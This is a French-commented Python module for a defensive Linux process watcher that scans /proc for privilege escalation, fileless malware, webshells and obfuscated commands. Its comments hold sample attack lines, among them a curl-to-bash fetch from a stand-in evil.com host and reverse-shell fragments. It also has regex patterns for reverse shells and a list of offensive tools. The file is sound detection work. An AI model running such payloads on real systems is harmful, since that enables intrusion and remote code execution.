"""
core/process_watcher.py
-----------------------
Surveillance des processus en cours d'exécution.

Lit directement dans /proc — le filesystem virtuel du kernel Linux
qui expose TOUTE la vie interne du système en temps réel.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
QU'EST-CE QUE /proc ?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  /proc est un pseudo-filesystem — il n'existe pas sur disque.
  Le kernel le génère à la volée en RAM à chaque lecture.

  Structure :
    /proc/<PID>/         → dossier pour chaque processus actif
    /proc/<PID>/status   → nom, PID, PPID, UID réel vs UID effectif
    /proc/<PID>/cmdline  → ligne de commande complète (args inclus)
    /proc/<PID>/exe      → symlink vers l'exécutable (peut être deleted!)
    /proc/<PID>/fd/      → tous les file descriptors ouverts
    /proc/<PID>/maps     → régions mémoire mappées (détecte l'injection)
    /proc/<PID>/net/tcp  → connexions réseau du processus

  Intérêt cyber : un attaquant peut renommer son malware "kworker"
  ou "systemd-private" pour se camoufler, mais /proc/exe révèle
  le vrai chemin de l'exécutable — même s'il a été supprimé du disque !


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CONCEPTS FONDAMENTAUX LINUX COUVERTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  UID RÉEL vs UID EFFECTIF (EUID) — Privilege Escalation
  ───────────────────────────────────────────────────────
  Chaque processus a DEUX identités :
    - UID  (Real User ID)      = qui a lancé le processus
    - EUID (Effective User ID) = avec quels droits il s'exécute

  Normalement UID == EUID.

  Exception : fichiers avec le bit SUID (Set User ID) :
    Si /usr/bin/sudo est SUID root → quand user "alice" le lance,
    UID=1000 (alice) mais EUID=0 (root).

  Technique d'exploitation :
    Un attaquant trouve un binaire SUID vulnérable (buffer overflow etc.)
    → l'exploite → obtient EUID=0 → devient root.

    Si on voit un processus avec UID=1000 et EUID=0,
    et que ce n'est PAS sudo/su/passwd → ALERTE ROUGE.


  PPID (Parent Process ID) — Détection d'anomalies d'héritage
  ─────────────────────────────────────────────────────────────
  Chaque processus a un parent.
  L'arbre de processus "normal" ressemble à :
    systemd (PID 1)
      └── sshd
            └── bash
                  └── python script.py

  Anomalies révélatrices :
    - Un shell (bash/sh) dont le parent est apache/nginx → webshell
    - Un shell dont le parent est python/php → reverse shell activé
    - Un processus réseau dont le parent est cron → persistence backdoor
    - Un bash dont PPID=1 (orphelin de systemd) → processus détaché


  MALWARE "FILELESS" — Exécutable supprimé mais toujours actif
  ─────────────────────────────────────────────────────────────
  Technique avancée : un malware se lance, puis SUPPRIME son propre
  exécutable du disque. Le processus continue de tourner en RAM.

  Détection : /proc/<PID>/exe pointe vers "/path/to/malware (deleted)"
  → Le kernel garde le fichier en mémoire tant que le processus tourne,
    mais il est invisible sur le disque (ls, find ne le trouvent pas).

  C'est le malware "fileless" — aucune trace sur disque, mais visible
  dans /proc. Seule façon de le détecter = inspecter /proc/exe.


  INJECTION MÉMOIRE — Processus légitime corrompu
  ─────────────────────────────────────────────────
  Un processus légitime (ex: bash) peut avoir du code malveillant
  INJECTÉ dans sa mémoire via ptrace() ou /proc/<PID>/mem.

  Détection partielle : /proc/<PID>/maps montre des régions mémoire
  avec permissions rwx (read+write+execute) sans fichier associé.
  Normalement une région est soit writable soit executable, pas les deux.
  rwx anonyme = shellcode injecté.


  PROCESSUS ZOMBIE ET ORPHELIN
  ─────────────────────────────
  Zombie : processus terminé mais non "reapé" par son parent.
    /proc/<PID>/status : State: Z
    Pas dangereux seul, mais beaucoup de zombies = bug ou rootkit.

  Orphelin : processus dont le parent est mort → adopté par PID 1 (init).
    PPID = 1 pour un processus interactif = suspect.
"""

import os
import re
import pwd
from pathlib import Path
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.logger import get_logger

# ──────────────────────────────────────────────────────────────────────────────
# WHITELIST SUID — binaires système légitimes qui peuvent avoir EUID=0
#
# Règle : un binaire SUID est LÉGITIME si :
#   1. Il est dans cette whitelist (installé par la distro, rôle connu)
#   2. ET vérifié via dpkg/rpm comme appartenant à un paquet système
#
# Il est SUSPECT si :
#   1. Hors de cette whitelist ET hors des chemins système standards
#   2. OU dans /tmp, /dev/shm, /home, /var/tmp (pas un chemin système)
#   3. OU modifié récemment sans mise à jour système connue
#
# Différence clé entre "surface d'attaque" et "compromission active" :
#   Surface d'attaque  = binaire SUID légitime mais potentiellement exploitable
#                        → signaler en MEDIUM avec note explicative, pas CRITICAL
#   Compromission      = binaire SUID dans /tmp ou hors package manager
#                        → CRITICAL
# ──────────────────────────────────────────────────────────────────────────────

# Binaires SUID strictement nécessaires à leur fonctionnement
# (aucune alternative sans SUID n'existe sur Linux)
LEGIT_SUID_PROCS = {
    # Auth & session
    "sudo", "su", "passwd", "newgrp", "gpasswd", "chsh", "chfn",
    "login", "sshd", "ssh-keysign",
    # Réseau bas niveau
    "ping", "ping6",
    # Montage filesystem
    "mount", "umount", "fusermount", "fusermount3",
    # Services système
    "cron", "at", "atd", "batch",
    "polkit", "pkexec",
    "dbus-daemon", "dbus-daemon-launch-helper",
    # Paquets / snaps
    "newuidmap", "newgidmap",
    "snap-confine", "snap-update-ns",
    # Display / graphique
    "Xorg", "xorg", "xorg.wrap",
    # Virtualisation (normal sur machine avec VirtualBox/VMware/LXC)
    "VBoxNetAdpCtl", "VBoxNetDHCP", "VBoxNetNAT",
    "VBoxVolInfo", "VBoxHeadless", "VirtualBoxVM",
    "lxc-user-nic",
    # Sandboxes Chromium/Electron (Chrome, Electron, MongoDB Compass, RStudio...)
    "chrome-sandbox",
}

# Chemins système légitimes pour les binaires SUID
# Un SUID hors de ces chemins est beaucoup plus suspect
LEGIT_SUID_PATHS = {
    "/usr/bin/", "/usr/sbin/", "/usr/lib/", "/usr/libexec/",
    "/bin/", "/sbin/",
    "/usr/local/bin/", "/usr/local/sbin/",
    "/opt/google/", "/opt/microsoft/",        # apps tierces legit
    "/usr/lib/virtualbox/",                    # VirtualBox
    "/usr/lib/snapd/",                         # Snap
    "/usr/lib/x86_64-linux-gnu/",             # libs distro
    "/usr/lib/lxc/",                           # LXC
}

# Binaires SUID qui ont des CVE connus — surface d'attaque réelle
# → signaler en MEDIUM avec note CVE, pas CRITICAL (sauf si hors chemins légitimes)
SUID_KNOWN_CVE = {
    "pkexec":     "CVE-2021-4034 (PwnKit) — local privilege escalation, patch si < polkit 0.120",
    "sudo":       "CVE-2021-3156 (Baron Samedit), CVE-2019-14287 — vérifier version",
    "dbus-daemon-launch-helper": "Surface d'attaque DBus — normal système mais historique CVE",
    "ssh-keysign": "Composant SSH sensible — normal système mais accès clés privées host",
    "snap-confine": "Surface d'attaque Snap — CVEs historiques, vérifier si à jour",
}

# Processus dont la présence d'un binaire "(deleted)" est NORMALE
# (mise à jour à chaud, auto-updater, sandbox multiprocess)
LEGIT_DELETED_PATTERNS = {
    "chrome", "chromium", "google-chrome",      # Chrome auto-update
    "crashpad_handler",                           # Chrome crash reporter
    "chrome_crashpad",
    "firefox", "firefox-bin",                    # Firefox
    "code", "code-oss",                          # VS Code
    "electron",                                  # Electron apps
    "slack", "discord", "teams",                 # Electron apps
    "spotify",
    "updater", "update",                         # auto-updaters génériques
}

# Shells — un shell enfant d'un service web = webshell actif
SHELLS = {"bash", "sh", "zsh", "ksh", "fish", "dash", "rbash"}

# Services web — si leur enfant est un shell, c'est une compromission
WEB_PROCESSES = {
    "apache", "apache2", "nginx", "httpd",
    "php", "php-fpm", "php8", "php7",
    "python", "python3", "ruby", "perl",
    "node", "nodejs",
    "tomcat", "jetty",
}

# Outils offensifs connus — présence = compromission quasi-certaine
OFFENSIVE_TOOLS = {
    "mimikatz", "meterpreter", "metasploit", "empire",
    "cobaltstrike", "beacon", "sliver", "havoc",
    "ncat", "socat", "netcat",
    "masscan", "zmap",
    "hydra", "medusa", "hashcat",
    "sqlmap", "nikto",
    "chisel", "ligolo", "frp",   # tunneling tools
    "pwncat", "weevely",         # webshell clients
}

# Ports système réservés (< 1024) → nécessitent root normalement
# Un processus non-root écoutant sur ces ports = escalade probable
PRIVILEGED_PORTS = 1024


# ──────────────────────────────────────────────
# Point d'entrée principal
# ──────────────────────────────────────────────
def run(
    log_file: Path | None = None,
    verbose:  bool = False,
) -> list[dict]:
    """
    Scanne tous les processus actifs via /proc et retourne les findings.

    Heuristiques appliquées :
      1. UID réel ≠ UID effectif → privilege escalation potentielle
      2. Exécutable supprimé (deleted) → malware fileless
      3. Shell enfant d'un serveur web → webshell actif
      4. Nom d'outil offensif connu → compromission
      5. Processus caché (PID dans /proc mais absent de /proc/<PID>/status)
      6. Ligne de commande encodée/obfusquée (base64, eval...)
      7. Processus orphelin suspect (PPID=1 + shell)
    """
    log = get_logger("process_watcher", log_file, verbose)
    log.info("Starting process scan via /proc")

    # Collecter tous les PIDs actifs
    pids = _get_all_pids()
    log.info(f"Active PIDs found: {len(pids)}")

    findings: list[dict] = []

    # Analyse en parallèle — chaque processus est indépendant
    with ThreadPoolExecutor(max_workers=8) as executor:
        future_to_pid = {
            executor.submit(_analyze_process, pid, log): pid
            for pid in pids
        }
        for future in as_completed(future_to_pid):
            result = future.result()
            if result:
                findings.append(result)
                log.warning(
                    f"Suspicious process [{result['severity']}] "
                    f"PID={result['details'].get('pid')} "
                    f"| {result['reason']}"
                )

    log.info(f"Process scan complete | {len(findings)} finding(s)")
    return findings


# ──────────────────────────────────────────────
# Collecte des PIDs
# ──────────────────────────────────────────────
def _get_all_pids() -> list[int]:
    """
    Retourne la liste de tous les PIDs actifs en lisant /proc.

    /proc contient un dossier numéroté par PID pour chaque processus.
    On filtre les entrées numériques = PIDs.

    Pourquoi pas utiliser psutil ou ps ?
      → Dépendance externe évitée (psutil) ou appel subprocess (ps).
      → Un rootkit avancé peut hooker ps pour cacher des PIDs,
        mais /proc est plus difficile à falsifier sans patcher le kernel.
      → Lire /proc directement = plus proche du kernel = plus fiable.
    """
    pids = []
    try:
        for entry in os.listdir("/proc"):
            if entry.isdigit():
                pids.append(int(entry))
    except PermissionError:
        pass
    return sorted(pids)


# ──────────────────────────────────────────────
# Analyse d'un processus individuel
# ──────────────────────────────────────────────
def _analyze_process(pid: int, log) -> dict | None:
    """
    Analyse un processus donné via ses fichiers /proc/<PID>/*.
    Retourne un finding si suspect, None si propre.
    """
    proc_dir = Path(f"/proc/{pid}")
    if not proc_dir.exists():
        # Processus déjà terminé entre la collecte et l'analyse — normal
        return None

    # ── Lecture de /proc/<PID>/status ───────────────────────────────
    # Ce fichier contient : nom, état, UID réel, UID effectif, PPID...
    status = _read_proc_status(pid)
    if not status:
        return None

    name  = status.get("Name",  "unknown")
    ppid  = int(status.get("PPid", "0"))
    state = status.get("State", "?")[0]  # R=running, S=sleeping, Z=zombie

    # UIDs : format "UID_réel  UID_effectif  UID_sauvé  UID_filesystem"
    uids_raw  = status.get("Uid", "0 0 0 0").split()
    uid_real  = int(uids_raw[0]) if uids_raw else 0
    uid_eff   = int(uids_raw[1]) if len(uids_raw) > 1 else 0

    # ── Lecture de /proc/<PID>/cmdline ──────────────────────────────
    # Ligne de commande complète avec arguments (séparés par \x00)
    cmdline = _read_cmdline(pid)

    # ── Lecture de /proc/<PID>/exe ──────────────────────────────────
    # Chemin réel de l'exécutable (symlink résolu par le kernel)
    exe_path = _read_exe(pid)

    reasons:  list[str] = []
    severity: str = "LOW"
    details: dict = {
        "pid":      pid,
        "name":     name,
        "ppid":     ppid,
        "state":    state,
        "uid_real": uid_real,
        "uid_eff":  uid_eff,
        "cmdline":  cmdline[:200] if cmdline else "",
        "exe":      exe_path or "",
    }

    # Définis ici une fois pour tous les checks
    # Évite le NameError si utilisés dans un check avant leur bloc if
    name_lower    = name.lower()
    cmdline_lower = cmdline.lower() if cmdline else ""

    # ── Check 1 : Privilege Escalation (UID réel ≠ UID effectif) ────
    #
    # Logique en 3 niveaux — distingue surface d'attaque vs compromission :
    #
    # CRITICAL : binaire SUID hors chemins système OU hors package manager
    # MEDIUM   : binaire SUID légitime avec CVE connu
    # IGNORÉ   : whitelist + chemin légitime + pas de CVE → bruit
    if uid_real > 0 and uid_eff == 0:
        try:
            username = pwd.getpwuid(uid_real).pw_name
            details["username"] = username
        except KeyError:
            details["username"] = str(uid_real)

        # Est-ce que l'exe est dans un chemin système légitime ?
        exe_in_legit_path = exe_path and any(
            exe_path.startswith(p) for p in LEGIT_SUID_PATHS
        )
        # Est-ce que l'exe est dans /tmp, /dev/shm, /home... (très suspect)
        exe_in_risky_path = exe_path and any(
            exe_path.startswith(p) for p in ("/tmp/", "/dev/shm/", "/home/", "/var/tmp/", "/run/user/")
        )
        # Vérification package manager (best-effort)
        pkg_owned = _check_package_ownership(exe_path) if exe_path else None

        if name_lower not in LEGIT_SUID_PROCS or exe_in_risky_path:
            # Hors whitelist OU dans chemin à risque → vraiment suspect
            reasons.append(
                f"Suspicious SUID process: UID={uid_real} but EUID=0 "
                f"— '{name}' not in system SUID whitelist"
                + (f" — running from high-risk path: {exe_path}" if exe_in_risky_path else "")
                + ("" if pkg_owned else " — NOT owned by any package (unverified binary)")
            )
            severity = _escalate(severity, "CRITICAL" if exe_in_risky_path else "HIGH")

        elif name_lower in SUID_KNOWN_CVE:
            # Dans la whitelist MAIS CVE connu → MEDIUM avec note
            cve_note = SUID_KNOWN_CVE[name_lower]
            reasons.append(
                f"SUID binary with known CVE history: '{name}' — {cve_note}"
            )
            severity = _escalate(severity, "MEDIUM")
            details["cve_note"] = cve_note

        # else: whitelist + chemin légitime + pas de CVE → on ne remonte rien
        # C'est du bruit — mount, ping, fusermount3... font ça par conception

    # ── Check 2 : Exécutable supprimé (Fileless Malware) ────────────
    #
    # Technique malware : se lancer puis supprimer son propre exécutable.
    # Reste en RAM, invisible sur disque. /proc/<PID>/exe contient "(deleted)".
    #
    # MAIS : comportement NORMAL pour Chrome, Firefox, Electron, auto-updaters.
    # Chrome spawn des dizaines de process et met à jour ses binaires à chaud.
    # → Un "(deleted)" sur "chrome" ou "crashpad_handler" = mise à jour normale.
    #
    # Logique : on ne remonte que si le nom du process n'est PAS dans
    # LEGIT_DELETED_PATTERNS et que le chemin n'est pas un chemin app légitime.
    if exe_path and "(deleted)" in exe_path:
        # Extraire le nom de base de l'exe (sans le "(deleted)")
        exe_clean = exe_path.replace(" (deleted)", "").strip()
        exe_basename = exe_clean.split("/")[-1].lower()

        # Vérifier si c'est un processus connu pour ce comportement
        is_legit_deleted = any(
            pattern in exe_basename or pattern in name_lower
            for pattern in LEGIT_DELETED_PATTERNS
        )
        # Chemin app légitime (pas /tmp ou /dev/shm)
        is_legit_path = any(
            exe_clean.startswith(p) for p in LEGIT_SUID_PATHS
        ) or exe_clean.startswith("/opt/")

        if not is_legit_deleted and not is_legit_path:
            reasons.append(
                f"Fileless malware indicator: executable deleted from disk "
                f"but still running — unusual for this process type | exe='{exe_path}'"
            )
            severity = _escalate(severity, "CRITICAL")
        elif exe_clean.startswith("/tmp/") or exe_clean.startswith("/dev/shm/"):
            # Exécutable dans /tmp même légitime = très suspect
            reasons.append(
                f"Process running from high-risk volatile path: '{exe_path}'"
            )
            severity = _escalate(severity, "HIGH")
        # else: Chrome/Electron/updater → bruit normal, on ignore

    # ── Check 3 : Shell enfant d'un serveur web (Webshell actif) ────
    #
    # Scénario d'attaque classique :
    #   1. Attaquant upload un webshell PHP sur un site web vulnérable
    #   2. Il l'active via HTTP → le serveur web (apache/nginx) exécute PHP
    #   3. PHP exécute system("bash -c '...'") → spawn un shell
    #   4. Ce shell est enfant de apache/nginx → détectable ici
    #
    # Arbre de processus normal :
    #   apache2 (PID 123)
    #     └── apache2 worker (PID 456)   ← enfants normaux
    #
    # Arbre suspect :
    #   apache2 (PID 123)
    #     └── php (PID 456)
    #           └── bash (PID 789)   ← ALERTE
    #
    # Le PPID de bash = 456 (php), qui lui-même est enfant d'apache.
    # On détecte un niveau d'indirection.
    if name_lower in SHELLS:
        parent_name = _get_process_name(ppid)
        if parent_name and parent_name.lower() in WEB_PROCESSES:
            reasons.append(
                f"Webshell detected: shell '{name}' (PID {pid}) "
                f"spawned by web process '{parent_name}' (PPID {ppid})"
            )
            severity = _escalate(severity, "CRITICAL")

    # ── Check 4 : Outil offensif connu ──────────────────────────────
    #
    # Certains outils n'ont aucune raison légitime d'être en production :
    # mimikatz (dump de credentials Windows), meterpreter (C2 Metasploit),
    # sliver/havoc/cobaltstrike (C2 frameworks modernes)...
    #
    # Si on les voit dans le nom du processus OU dans la cmdline → compromission.
    # Un pentester légitime aurait dû préavertir et documenter son travail.
    for tool in OFFENSIVE_TOOLS:
        if tool in name_lower or tool in cmdline_lower:
            reasons.append(
                f"Known offensive tool detected: '{tool}' in process '{name}'"
            )
            severity = _escalate(severity, "CRITICAL")
            break

    # ── Check 5 : Ligne de commande obfusquée ───────────────────────
    #
    # Les malwares et reverse shells obfusquent souvent leur cmdline :
    #   python3 -c "exec(__import__('base64').b64decode('aW1wb3...'))"
    #   bash -c "$(curl -s http://evil.com/payload.sh)"
    #   perl -e 'use Socket; ...'   ← one-liner reverse shell classique
    #
    # L'obfuscation en base64 est le signe le plus fort :
    #   Un admin légitime n'a jamais besoin de base64-encoder ses commandes.
    #   Un malware le fait pour éviter les signatures statiques.
    if cmdline:
        obfusc_patterns = [
            (r"base64\s*-d",          "base64 decode in cmdline"),
            (r"exec\s*\(\s*__import__","Python exec+import obfuscation"),
            (r"\$\(curl\s+",           "curl-in-subshell execution"),
            (r"\$\(wget\s+",           "wget-in-subshell execution"),
            (r"bash\s+-i\s+>&",        "interactive reverse shell"),
            (r"perl\s+-e\s+'use\s+Socket", "Perl reverse shell one-liner"),
            (r"python[23]?\s+-c\s+\"import\s+socket", "Python socket reverse shell"),
            (r"/dev/tcp/",             "Bash /dev/tcp reverse shell"),
        ]
        for pattern, desc in obfusc_patterns:
            if re.search(pattern, cmdline, re.IGNORECASE):
                reasons.append(f"Obfuscated cmdline: {desc}")
                severity = _escalate(severity, "HIGH")
                break

    # ── Check 6 : Processus orphelin suspect ────────────────────────
    #
    # Un processus orphelin = son parent est mort, adopté par PID 1.
    # C'est SOUVENT légitime : scripts système, jobs cron, sessions tmux,
    # services qui se détachent volontairement (daemons), crash du parent.
    #
    # Ce n'est PAS une preuve de reverse shell — c'est une HEURISTIQUE faible.
    # Un reverse shell réel aurait EN PLUS : connexion réseau sortante,
    # TTY interactif anormal, et pas de TTY logé dans /var/run/utmp.
    #
    # On remonte en MEDIUM (pas HIGH) car seul, c'est insuffisant.
    # La corrélation avec network_monitor est nécessaire pour confirmer.
    if ppid == 1 and name_lower in SHELLS:
        # Vérifier si le shell a un TTY (terminal physique = légitime)
        # Pas de TTY = plus suspect (process détaché sans terminal)
        has_tty = _has_tty(pid)
        sev = "MEDIUM" if has_tty else "MEDIUM"  # reste MEDIUM dans les deux cas
        reasons.append(
            f"Orphan shell: '{name}' (PID {pid}) adopted by PID 1 (init)"
            f"{' — has TTY (may be legitimate terminal session)' if has_tty else ' — no TTY (detached process)'}"
            f" — correlate with network_monitor to confirm reverse shell"
        )
        severity = _escalate(severity, sev)

    # ── Check 7 : Processus zombie en masse ─────────────────────────
    #
    # Un zombie = processus terminé mais non "récolté" par son parent.
    # Seuls : inoffensifs. En masse : signe d'un programme bugué
    # ou d'un rootkit qui fork() massivement sans wait().
    # (Détection en masse gérée dans run(), pas ici par processus.)

    # ── Résultat ─────────────────────────────────────────────────────
    if not reasons:
        return None

    return {
        "severity":  severity,
        "target":    f"PID {pid} ({name})",
        "reason":    " | ".join(reasons),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "module":    "process_watcher",
        "details":   details,
    }


# ──────────────────────────────────────────────
# Helpers contextuels
# ──────────────────────────────────────────────

def _check_package_ownership(exe_path: str) -> bool | None:
    """
    Vérifie si un exécutable appartient à un paquet installé.
    C'est LA vraie distinction entre un binaire SUID légitime et un rootkit.

    Un binaire SUID installé par apt/dpkg → partie du système, légitime.
    Un binaire SUID sans paquet associé → suspect, pourrait être un rootkit.

    Retourne :
      True  → appartient à un paquet connu
      False → aucun paquet ne revendique ce fichier
      None  → dpkg/rpm non disponible ou erreur

    Concept : les package managers maintiennent une base de données
    de tous les fichiers installés avec leurs checksums.
    dpkg -S /usr/bin/fusermount3 → "fuse3: /usr/bin/fusermount3"
    Si le résultat est vide → le fichier n'a pas été installé proprement.
    """
    import subprocess
    if not exe_path:
        return None
    # Nettoyer "(deleted)" si présent
    clean_path = exe_path.replace(" (deleted)", "").strip()
    try:
        # dpkg (Debian/Ubuntu)
        r = subprocess.run(
            ["dpkg", "-S", clean_path],
            capture_output=True, text=True, timeout=3
        )
        if r.returncode == 0 and r.stdout.strip():
            return True
        # rpm (RedHat/CentOS) — fallback
        r2 = subprocess.run(
            ["rpm", "-qf", clean_path],
            capture_output=True, text=True, timeout=3
        )
        if r2.returncode == 0 and "not owned" not in r2.stdout:
            return True
        return False
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        return None  # Package manager non disponible


def _has_tty(pid: int) -> bool:
    """
    Vérifie si un processus a un terminal (TTY) associé.

    Un shell avec TTY = session interactive légitime (terminal, SSH).
    Un shell sans TTY = processus détaché (daemon, script, ou reverse shell).

    Lecture via /proc/<PID>/stat — champ tty_nr (7ème champ).
    tty_nr = 0 → pas de terminal (process détaché)
    tty_nr > 0 → terminal associé

    C'est une heuristique : un reverse shell peut avoir un TTY
    si l'attaquant fait "python3 -c 'import pty; pty.spawn("/bin/bash")'".
    """
    try:
        stat_content = open(f"/proc/{pid}/stat").read()
        fields = stat_content.split()
        if len(fields) > 6:
            tty_nr = int(fields[6])
            return tty_nr != 0
    except (FileNotFoundError, ValueError, PermissionError, OSError):
        pass
    return False


# ──────────────────────────────────────────────
# Helpers de lecture /proc
# ──────────────────────────────────────────────
def _read_proc_status(pid: int) -> dict[str, str] | None:
    """
    Lit /proc/<PID>/status et retourne un dict clé→valeur.

    Format du fichier :
      Name:   bash
      State:  S (sleeping)
      Pid:    1234
      PPid:   1000
      Uid:    1000  1000  1000  1000
      ...

    Chaque ligne = "Clé:\tValeur".
    """
    status_file = Path(f"/proc/{pid}/status")
    try:
        content = status_file.read_text(encoding="utf-8", errors="replace")
        result  = {}
        for line in content.splitlines():
            if ":" in line:
                key, _, val = line.partition(":")
                result[key.strip()] = val.strip()
        return result
    except (PermissionError, FileNotFoundError, ProcessLookupError, OSError):
        return None


def _read_cmdline(pid: int) -> str:
    """
    Lit /proc/<PID>/cmdline — la commande complète avec ses arguments.

    Les arguments sont séparés par le caractère nul \\x00 (NUL byte).
    On les remplace par des espaces pour avoir une string lisible.

    Subtilité : un processus peut modifier son propre /proc/cmdline
    pour se camoufler (technique "argv[0] spoofing").
    Ex: un malware peut se renommer "kworker/0:1" dans cmdline
    mais /proc/exe révèle le vrai binaire.
    """
    try:
        data = Path(f"/proc/{pid}/cmdline").read_bytes()
        return data.replace(b"\x00", b" ").decode("utf-8", errors="replace").strip()
    except (PermissionError, FileNotFoundError, OSError):
        return ""


def _read_exe(pid: int) -> str | None:
    """
    Résout le symlink /proc/<PID>/exe → chemin réel de l'exécutable.

    Si le fichier a été supprimé, le kernel ajoute " (deleted)" au chemin.
    C'est la détection clé du malware fileless.

    Nécessite souvent root pour lire les exe d'autres utilisateurs.
    """
    try:
        return os.readlink(f"/proc/{pid}/exe")
    except (PermissionError, FileNotFoundError, OSError):
        return None


def _get_process_name(pid: int) -> str | None:
    """Retourne le nom d'un processus par son PID, ou None."""
    status = _read_proc_status(pid)
    return status.get("Name") if status else None


# ──────────────────────────────────────────────
# Escalade de sévérité
# ──────────────────────────────────────────────
_SEV_RANK = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}

def _escalate(current: str, candidate: str) -> str:
    return candidate if _SEV_RANK.get(candidate, 0) > _SEV_RANK.get(current, 0) else current